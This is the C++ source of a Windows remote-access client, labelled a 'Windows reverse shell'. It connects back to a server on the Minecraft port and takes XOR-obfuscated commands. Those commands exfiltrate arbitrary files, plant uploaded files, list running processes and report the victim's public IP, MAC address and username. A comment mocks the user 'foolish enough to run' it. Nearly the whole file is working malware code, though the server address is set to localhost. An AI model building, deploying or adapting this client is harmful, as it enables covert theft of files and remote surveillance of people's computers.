/*
author: @Reycecar
Windows reverse shell

Compile instructions:
g++.exe -fdiagnostics-color=always -g client.cpp -o client.exe -lwsock32 -lrpcrt4 -lWs2_32 -lwininet -liphlpapi -lurlmon -fpermissive
*/

#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <vector>
#include <string>
#include <iomanip>
#include <algorithm>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <wininet.h>
#include <winsock.h>
#include <iptypes.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <string.h>
#include <rpc.h>
// newly added
#include <tchar.h>
#include <comdef.h>
#include <locale>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Rpcrt4.lib")

#define SERV_PORT "25565" //Default port for Minecraft Java
#define SERV_ADDR "127.0.0.1"
#define DEFAULT_BUFLEN 1024
using namespace std;

// used to encrypt/decrypt data
char* xor_func(char msg[]) {
	for (int i = 0; i < strlen(msg); i++) {
		msg[i] ^= '+';
	}
	return msg;
}

// get the username of the user foolish enough to run this godforsaken program
std::string getUsername() {
	DWORD bufferSize = 0;
	GetUserNameA(NULL, &bufferSize);
	if (bufferSize == 0) {
		return ""; // If username space is 0 return emptystring
	}
	char* buffer = new char[bufferSize];
	if (GetUserNameA(buffer, &bufferSize)) {
		std::string username(buffer);
		delete[] buffer;
		return username;
	}
	delete[] buffer;
	return "";
}

std::string getMACs() {
	std::string mac;
	ULONG size = 0;

	// Get the network adapter information
	if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &size) != ERROR_BUFFER_OVERFLOW) {
		return ""; // if buffer overflow: ret blank
	}
	PIP_ADAPTER_ADDRESSES adapterAddresses = (PIP_ADAPTER_ADDRESSES)malloc(size);
	if (adapterAddresses == NULL) {
		return ""; // if not adapter addresses: ret blank
	}
	if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapterAddresses, &size) != NO_ERROR) {
		free(adapterAddresses);
		return ""; // if errors: ret blank
	}

	// Iterate over the network adapters and find the MAC address
	PIP_ADAPTER_ADDRESSES adapter = adapterAddresses;
	while (adapter != NULL) {
		if (adapter->PhysicalAddressLength > 0) {
			char macBuff[18];
			// format mac into string
			sprintf_s(macBuff, sizeof(macBuff), "%02X:%02X:%02X:%02X:%02X:%02X",
				adapter->PhysicalAddress[0], adapter->PhysicalAddress[1], adapter->PhysicalAddress[2],
				adapter->PhysicalAddress[3], adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
			mac = macBuff;
			break;
		}
		adapter = adapter->Next;
	}

	// Clean up, Clean Up, Everybody Do your share!
	free(adapterAddresses);
	return mac;
}

// Helper function for getPublicIP()
std::string get_response_string(HANDLE hReq) {
	BOOL reqSuccess = HttpSendRequestA(hReq, NULL, NULL, NULL, NULL);
	if (reqSuccess) {
		// Initialize variables for internetReadFile
		DWORD recvData = 0;
		DWORD chunkSize = 2048;
		std::string buf;
		std::string chunk(chunkSize, 0);
		while (InternetReadFile(hReq, &chunk[0], chunkSize, &recvData) && recvData) {
			chunk.resize(recvData);
			buf += chunk;
		}
		//return file read buffer data
		return buf;
	}
	return nullptr;
}

// Function for getting the public facing IP address.
std::string getPublicIP() {
	HANDLE hInt = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	// Create hConnect handle for ifconfig.me
	HANDLE hConn = InternetConnectA(hInt, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	// Pass hConnect handle into HttpOpenRequestA with request to ifconfig.me/ip
	HANDLE hReq = HttpOpenRequestA(hConn, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	// Helper function returns response string generated by ifconfig.me
	std::string resp = get_response_string(hReq);
	if (hReq) { // If hRequest is successful: teardown (In reverse order of creation!!!)
		InternetCloseHandle(hReq);
	}
	if (hConn) { // If hConnect is successful: teardown
		InternetCloseHandle(hConn);
	}
	return resp;
}

// sample ListProcesses function maybe

//wstring GetProcessList( );
BOOL ListProcessModules( DWORD dwPID );
BOOL ListProcessThreads( DWORD dwOwnerPID );
void printError( const TCHAR* msg );

std::string GetProcessList()
{
	std::string processList;

    // Create a snapshot of the current processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        // Error: Failed to create snapshot
        processList = "Failed to create snapshot";
        return processList;
    }

    // Get information about the first process in the snapshot
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32))
    {
        // Error: Failed to retrieve process information
        processList = "Failed to retrieve process information";
        CloseHandle(hSnapshot);
        return processList;
    }

    // Loop through all processes in the snapshot and append their names to the processList string
	char processName[260]; //WCHAR to char*
	int len; // length of process string
	char pidStr[20]; // init char* to store DWORD pid as a string
	char process[len]; //process string to append to process string list
    do {
		
		DWORD pid = pe32.th32ProcessID;
		memcpy(processName, pe32.szExeFile, 260); // copy the smaller value (either 1024 or the length of the string) into the buffer
		sprintf(pidStr, "%lu", pid); //put pid value into pidStr, padded with spaces
		len = snprintf(NULL, 0, "PID: %u | Name: %s\n", pid, processName); // determine the exact length of the process string
		
		 // create char* of process string length, no extra null bytes
		sprintf(process, "PID: %u | Name: %s\n", pid, processName);
		
		processList.append(process);
		
		//wcout << processName;// + L"\n";
    } while (Process32Next(hSnapshot, &pe32));

    // Close the snapshot handle
    CloseHandle(hSnapshot);

    return processList;
}


BOOL ListProcessModules( DWORD dwPID )
{
  HANDLE hModuleSnap = INVALID_HANDLE_VALUE;
  MODULEENTRY32 me32;

  // Take a snapshot of all modules in the specified process.
  hModuleSnap = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, dwPID );
  if( hModuleSnap == INVALID_HANDLE_VALUE )
  {
    printError( TEXT("CreateToolhelp32Snapshot (of modules)") );
    return( FALSE );
  }

  // Set the size of the structure before using it.
  me32.dwSize = sizeof( MODULEENTRY32 );

  // Retrieve information about the first module,
  // and exit if unsuccessful
  if( !Module32First( hModuleSnap, &me32 ) )
  {
    printError( TEXT("Module32First") );  // show cause of failure
    CloseHandle( hModuleSnap );           // clean the snapshot object
    return( FALSE );
  }

  // Now walk the module list of the process,
  // and display information about each module
  do
  {
    _tprintf( TEXT("\n\n     MODULE NAME:     %s"),   me32.szModule );
    _tprintf( TEXT("\n     Executable     = %s"),     me32.szExePath );
    _tprintf( TEXT("\n     Process ID     = 0x%08X"),         me32.th32ProcessID );
    _tprintf( TEXT("\n     Ref count (g)  = 0x%04X"),     me32.GlblcntUsage );
    _tprintf( TEXT("\n     Ref count (p)  = 0x%04X"),     me32.ProccntUsage );
    _tprintf( TEXT("\n     Base address   = 0x%08X"), (DWORD) me32.modBaseAddr );
    _tprintf( TEXT("\n     Base size      = %d"),             me32.modBaseSize );

  } while( Module32Next( hModuleSnap, &me32 ) );

  CloseHandle( hModuleSnap );
  return( TRUE );
}

BOOL ListProcessThreads( DWORD dwOwnerPID ) 
{ 
  HANDLE hThreadSnap = INVALID_HANDLE_VALUE; 
  THREADENTRY32 te32; 
 
  // Take a snapshot of all running threads  
  hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ); 
  if( hThreadSnap == INVALID_HANDLE_VALUE ) 
    return( FALSE ); 
 
  // Fill in the size of the structure before using it. 
  te32.dwSize = sizeof(THREADENTRY32); 
 
  // Retrieve information about the first thread,
  // and exit if unsuccessful
  if( !Thread32First( hThreadSnap, &te32 ) ) 
  {
    printError( TEXT("Thread32First") ); // show cause of failure
    CloseHandle( hThreadSnap );          // clean the snapshot object
    return( FALSE );
  }

  // Now walk the thread list of the system,
  // and display information about each thread
  // associated with the specified process
  do 
  { 
    if( te32.th32OwnerProcessID == dwOwnerPID )
    {
      _tprintf( TEXT("\n\n     THREAD ID      = 0x%08X"), te32.th32ThreadID ); 
      _tprintf( TEXT("\n     Base priority  = %d"), te32.tpBasePri ); 
      _tprintf( TEXT("\n     Delta priority = %d"), te32.tpDeltaPri ); 
      _tprintf( TEXT("\n"));
    }
  } while( Thread32Next(hThreadSnap, &te32 ) ); 

  CloseHandle( hThreadSnap );
  return( TRUE );
}

void printError( const TCHAR* msg )
{
  DWORD eNum;
  TCHAR sysMsg[256];
  TCHAR* p;

  eNum = GetLastError( );
  FormatMessage( FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
         NULL, eNum,
         MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language
         sysMsg, 256, NULL );

  // Trim the end of the line and terminate it with a null
  p = sysMsg;
  while( ( *p > 31 ) || ( *p == 9 ) )
    ++p;
  do { *p-- = 0; } while( ( p >= sysMsg ) &&
                          ( ( *p == '.' ) || ( *p < 33 ) ) );

  // Display the message
  _tprintf( TEXT("\n  WARNING: %s failed with error %d (%s)"), msg, eNum, sysMsg );
}
// newly added above


// get the windows os version
std::string getWinVer() {
	return std::string("Windows 10");
	// Deprecated
	/*
	OSVERSIONINFOEX osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&osvi); // Retrieve specific version of windows w/ GetVersionEx

	// Extract the major and minor version numbers
	int majorVersion = osvi.dwMajorVersion;
	int minorVersion = osvi.dwMinorVersion;

	// Get the build number if it is available
	int buildNumber = 0;
	if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT && majorVersion >= 6) {
		ULONGLONG conditionMask = 0;
		VER_SET_CONDITION(conditionMask, VER_BUILDNUMBER, VER_GREATER_EQUAL);
		osvi.dwBuildNumber = 0;
		// Verify that the system meets the condition
		if (VerifyVersionInfo(&osvi, VER_BUILDNUMBER, conditionMask)) {
			buildNumber = osvi.dwBuildNumber;
		}
	}

	// Determine the returned string based on the operating system
	std::ostringstream oss;
	oss << "Windows ";
	switch (majorVersion) {
	case 10:
		oss << "10";
		break;
	case 6:
		switch (minorVersion) {
		case 3:
			oss << "8.1";
			break;
		case 2:
			oss << "8";
			break;
		case 1:
			oss << "7";
			break;
		case 0:
			oss << "Vista";
			break;
		}
		break;
	case 5:
		switch (minorVersion) {
		case 2:
			oss << "Server 2003";
			break;
		case 1:
			oss << "XP";
			break;
		case 0:
			oss << "2000";
			break;
		}
		break;
	}
	if (buildNumber > 0) {
		oss << " (Build " << buildNumber << ")";
	}
	return oss.str();
	*/
}

//use previous functions in information string.
std::string getSysInfo() {
	return  "PUBLIC IP:\n" + getPublicIP() + "\n\n" +
		"MAC Addresses:\n" + getMACs() + "\n\n" +
		"WINDOWS VERSION:\n" + getWinVer() + "\n\n" +
		"USERNAME:\n" + getUsername();
}
/*
std::string wcharToStdString(const WCHAR* w_str){
	// figure out size required
	int buffer_size = WideCharToMultiByte(CP_UTF8, 0, w_str, -1, nullptr, 0, nullptr, nullptr);
	// make buffer of size
	char * buffer = new char[buffer_size];
	// convert to multibyte string
	WideCharToMultiByte(CP_UTF8, 0, w_str, -1, buffer, buffer_size, nullptr, nullptr);
	// make std::string to return with buffer info in it
	std::string str(buffer);

	delete[] buffer;

	return str;
}

//get data from process and turn it into human readable/understandable information
std::string listProcesses() {
    std::string processList;
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcess, &pe32)) {
		// add first process to the string list of processes
        processList += wcharToStdString(pe32.szExeFile);
		//add every string after it
		while (Process32Next(hProcess, &pe32)) {
			processList += "\n" + wcharToStdString(pe32.szExeFile);
		}
    }

	printf("Enum Processes Success!"); //debug

	CloseHandle(hProcess);
	return processList;
} */

// Client uploads to server.
int handle_upload(int sock, const char* filename) {
	char buf[DEFAULT_BUFLEN] = { 0 };
	ofstream file(filename, ios::binary);
	if (!file) {
		printf("Failed to create file %s", filename); // debug
		return 2;
	}

	int bytesRecvd = 0;
	while ((bytesRecvd = recv(sock, buf, DEFAULT_BUFLEN, 0)) > 0) {
		file.write(xor_func(buf), bytesRecvd);
	}

	if (bytesRecvd < 0) {
		printf("File receive error"); // debug
		return 1;
	}

	printf("File %s Received successfully", filename); // debug
	file.close();
	return 0;
}


// Client handles download from server.
void handle_download(int sock, const char* filename) {
	ifstream file(filename, ios::in | ios::binary);
	if (!file.is_open()) {
		printf("error creating file: %s\n", filename); // print error message
	}

	char buf[DEFAULT_BUFLEN];
	while (!file.eof()) {
		file.read(buf, DEFAULT_BUFLEN);
		int bytes_read = file.gcount();
		if (bytes_read > 0) {
			if (send(sock, xor_func(buf), bytes_read, 0) < 0) {
				printf("Failed to send data");
				return;
			}
		}
	}

	/*int filesize = 0;
	int total_read = 0;
	DWORD current_read_bytes = 0;
	DWORD read_bytes = 0;

	// read file size

	HANDLE fhandle = CreateFileA((LPCSTR) path, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (fhandle == INVALID_HANDLE_VALUE) {
		printf("CreateFileA error: %d\n", GetLastError());
		exit(-1);
	}

	// get file size

	filesize = GetFileSize(fhandle, NULL);
	printf("filesize: %d\n", filesize); // Debug
	if (filesize == INVALID_FILE_SIZE) {
		printf("filesize error: %d\n", GetLastError());
	}
	// send file size
	send(sock, (char *)&filesize, 4, 0);

	while (total_read < filesize) {
		if (!ReadFile(fhandle, buf, DEFAULT_BUFLEN, &read_bytes, NULL)) {
			printf("ReadFile Error: %d", GetLastError());
		}
		total_read += read_bytes;
		// xor data
		xor_func(buf, read_bytes);
		send(sock, buf, read_bytes, 0);
	}
	CloseHandle(fhandle);*/
}

int parseCmd(char cmd[]) {
	if (strstr(cmd, "end") != NULL) {
		return -1;
	}
	else if (strstr(cmd, "upload") != NULL) {
		return 0;
	}
	else if (strstr(cmd, "download") != NULL) {
		return 1;
	}
	else if (strstr(cmd, "processes") != NULL) {
		return 2;
	}
	else if (strstr(cmd, "systeminfo") != NULL) {
		return 3;
	}
	else {
		return -1;
	}
}

SOCKET getConnected() {
	WSADATA wsaData;
	SOCKET sock = INVALID_SOCKET;
	//struct sockaddr_in address;
	//struct sockaddr_in server;
	struct addrinfo* result = NULL;
	struct addrinfo hints;

	char recvbuf[DEFAULT_BUFLEN];
	int revcbuflen = DEFAULT_BUFLEN;
	int connResult;

	connResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (connResult != 0) {
		printf("WSAStartup failed with error: %d\n", connResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC; // Use AF_UNSPEC bcs localhost
	hints.ai_socktype = SOCK_STREAM; // socket type: sock stream
	hints.ai_protocol = IPPROTO_TCP; // IP protocol: TCP
	hints.ai_flags = AI_PASSIVE;

	// resolve server address and port
	connResult = getaddrinfo("localhost", SERV_PORT, &hints, &result);
	if (connResult != 0) {
		printf("getaddrinfo failed: %d\n", connResult);
		WSACleanup();
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

		if (sock == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		connResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (connResult == SOCKET_ERROR) {
			printf("Connection failed with error: %d\n", WSAGetLastError()); // debug
			closesocket(sock);
			sock = INVALID_SOCKET;
			continue;
		}
		break; //got a connection, or none worked
	}

	freeaddrinfo(result);

	if (sock == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	return sock;
}

void sendMsg(std::string data, SOCKET sock) {
	char* d = const_cast<char*>(data.c_str()); // cast getData as char* so it can be xor'd and used with strlen()
	size_t msgLenCount = strlen(d);
	printf("systeminfo length: %d\n", msgLenCount); //debug
	
	int msgLen = static_cast<int>(msgLenCount); // get length of message         
	stringstream ss; // init stringstream to hold msgLen
	ss << std::hex << msgLen; //send message length in hex
	string msgLenStr = ss.str(); // typecast stringstream to c++ string
	char* msgLenChar = const_cast<char*>(msgLenStr.c_str()); // typecast c++ string into char*
	printf("message length content: %s\n", msgLenChar); // show the message length message
	xor_func(msgLenChar); // xor the message length before sending
	char lenBuf[9]; // 9 spaces for hex length int, means message length can total up to 4 gigabytes
	strcpy(lenBuf, msgLenChar); // load xor'd data into buffer
	printf("message length xor'd: %s\n", lenBuf); // show the xor encoded message length message
	printf("sending %d bytes\n\n", strlen(lenBuf));  // show how many bytes are sent with message length message
	send(sock, lenBuf, strlen(lenBuf), 0); // send data
	
	// message sending logic
	size_t i = 0; // initialize msgLen count variable
	size_t bufferLen = DEFAULT_BUFLEN; // typecast DEFAULT_BUFLEN to size_t for comparison in std::min
	char tempBuf[msgLenCount]; // make temporary buffer as large as the message
	xor_func(d); // xor the datablock
	while(i < msgLenCount) { // while count is less than the length of the message
		size_t numToCopy = std::min(bufferLen, msgLenCount - i); // return the smaller of the parameter values
		memcpy(tempBuf, d + i, numToCopy); // copy the smaller value (either 1024 or the length of the string) into the buffer
		printf("datablock: \n%.*s\n", sizeof(tempBuf),tempBuf); // show what is sent in datablock
		i += numToCopy; // increment i by number of bytes put into the buffer, next time data will start where it ended
		printf("sending %d bytes\n", numToCopy);  // show how many bytes are sent in this datablock
		send(sock, tempBuf, numToCopy, 0); // send the message (message length <= 1024 bytes)
	}
	//delete[] tempBuf;
}

int main() {
	string filepath;
	int cmd;
	int command_packet_len;
	char buf[DEFAULT_BUFLEN];
	char recvbuf[DEFAULT_BUFLEN];
	SOCKET sock;
	sock = getConnected();

	printf("Connection to server successful! It's a miracle!!\n");

	while (true) {
		std::string data;
		std::wstring data2;
		int offset = 0;
		int getcmd;
		memset(buf, 0, DEFAULT_BUFLEN);
		memset(recvbuf, 0, DEFAULT_BUFLEN);
		getcmd = recv(sock, recvbuf, DEFAULT_BUFLEN, 0); //read cmd into buffer from sock
		/*
		recv(sock, (char *)&command_packet_len, 4, 0);

		char* filepath = (char*)malloc(command_packet_len);

		ZeroMemory(filepath, command_packet_len);
		*/

		printf("enc: %s ", recvbuf); // debug
		int cmd = parseCmd(xor_func(recvbuf));
		printf("dec: %s ", recvbuf); // debug
		printf("cmd int: %d \n", cmd); // debug

		switch (cmd) {
		case -1: { //end
			printf("Shutting down\n"); //debug
			shutdown(sock, 2);
			send(sock, buf, strlen(buf), 0);
			return 0;
		} break;

		case 0: {
			printf("From upload buffer: %s\n", buf);  //debug
			const char* filename = "received_file.txt";
			int confirm = handle_upload(sock, filename); // receive the file
			if (confirm == 0) {
				sprintf(buf, "Client Received File\n");
			}
			else if (confirm == 2) {
				sprintf(buf, "Client Failed to create file\n");
			}
			else {
				sprintf(buf, "File receive error\n");
			}
			// tell server client recieved the file (or not)
			xor_func(buf);
			send(sock, buf, strlen(buf), 0);
		} break;

		case 1: {
			printf("Download\n"); // debug
			// get filepath from server
			int bytes_received = recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
			if (bytes_received < 0) {
				printf("Failed to receive filepath\n"); // debug
			}
			filepath = recvbuf;
			// recvbuf[bytes_received] = '\0';

			handle_download(sock, filepath.c_str()); // fix
			// read command_packet_length bytes into filename
			// open filename, send chunks back out socket
		} break;

		//new case for getRunningProcess;
		case 2: {
            printf("processes\n");
            printf("debugggggg\n");
			data = GetProcessList();
			sendMsg(data, sock);
        } break;

		case 3: {
			printf("systeminfo\n");
			data = getSysInfo();
			sendMsg(data, sock);
		} break;
		}
		//free(path);
	}

}
